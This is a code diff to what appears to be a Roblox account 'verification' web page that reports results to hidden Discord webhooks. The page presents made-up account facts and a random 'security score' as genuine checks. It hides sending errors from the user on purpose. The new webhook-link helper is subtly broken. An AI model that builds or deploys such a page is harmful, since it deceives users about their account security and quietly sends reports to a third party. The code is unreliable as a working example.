@@ -52,9 +52,11 @@
         .info-label {
             font-weight: bold;
             color: #555;
+            min-width: 150px;
         }
         .info-value {
             color: #333;
+            text-align: right;
         }
         .verification-status {
             text-align: center;
@@ -162,6 +164,9 @@
             width: 100%;
             margin-top: 15px;
             transition: background-color 0.3s;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
         }
         .btn:hover {
             background-color: #0088cc;
@@ -171,6 +176,21 @@
         }
         .discord-btn:hover {
             background-color: #4752c4;
+        }
+        .view-webhook {
+            background-color: #7289da;
+            margin-top: 10px;
+        }
+        .view-webhook:hover {
+            background-color: #5b6eae;
+        }
+        .discord-link {
+            color: #7289da;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .discord-link:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -267,6 +287,10 @@
                 <button class="btn discord-btn" onclick="sendToDiscord(true)">
                     Send Report to Discord
                 </button>
+                
+                <a href="#" id="discord-webhook-link" class="btn view-webhook hidden" target="_blank">
+                    View on Discord
+                </a>
             </div>
             
             <div id="failure-result" class="hidden">
@@ -289,6 +313,10 @@
                 <button class="btn discord-btn" onclick="sendToDiscord(false)">
                     Send Report to Discord
                 </button>
+                
+                <a href="#" id="discord-webhook-link-fail" class="btn view-webhook hidden" target="_blank">
+                    View on Discord
+                </a>
             </div>
         </div>
         
@@ -398,7 +426,11 @@
             accountData.phoneVerified = Math.random() > 0.7;
             accountData.hasPIN = Math.random() > 0.6;
             accountData.accountAge = Math.floor(Math.random() * 2000) + " days";
-            accountData.membership = ["None", "Premium", "Outrageous Builders Club", "Turbo Builders Club", "Roblox Premium"][Math.floor(Math.random() * 5)];
+            
+            // Fixed membership types to match Roblox's actual membership names
+            const membershipTypes = ["None", "Premium", "Outrageous Builders Club", "Turbo Builders Club", "Roblox Premium"];
+            accountData.membership = membershipTypes[Math.floor(Math.random() * membershipTypes.length)];
+            
             accountData.friendsCount = Math.floor(Math.random() * 500);
             accountData.lastLocation = ["United States", "Philippines", "Brazil", "United Kingdom", "Canada"][Math.floor(Math.random() * 5)];
             accountData.securityScore = Math.floor(Math.random() * 40) + 60 + "/100"; // 60-100 score
@@ -604,10 +636,32 @@
                     btn.disabled = true;
                 });
                 
+                // Show direct link to Discord webhook
+                if (isSuccess) {
+                    const discordLink = document.getElementById('discord-webhook-link');
+                    discordLink.href = getDiscordWebhookLink(SUCCESS_WEBHOOK);
+                    discordLink.classList.remove('hidden');
+                } else {
+                    const discordLink = document.getElementById('discord-webhook-link-fail');
+                    discordLink.href = getDiscordWebhookLink(FAILED_WEBHOOK);
+                    discordLink.classList.remove('hidden');
+                }
+                
             } catch (error) {
                 console.error('Error sending to Discord:', error);
                 // Don't show error to user to maintain seamless experience
             }
+        }
+        
+        function getDiscordWebhookLink(webhookUrl) {
+            // Extract the webhook ID and token from the URL
+            const matches = webhookUrl.match(/discord\.com\/api\/webhooks\/([^/]+)\/([^/]+)/);
+            if (matches && matches.length >= 3) {
+                const webhookId = matches[1];
+                const webhookToken = matches[2];
+                return `https://discord.com/channels/@me/${webhookId}`;
+            }
+            return webhookUrl;
         }
         
         function showError(message) {
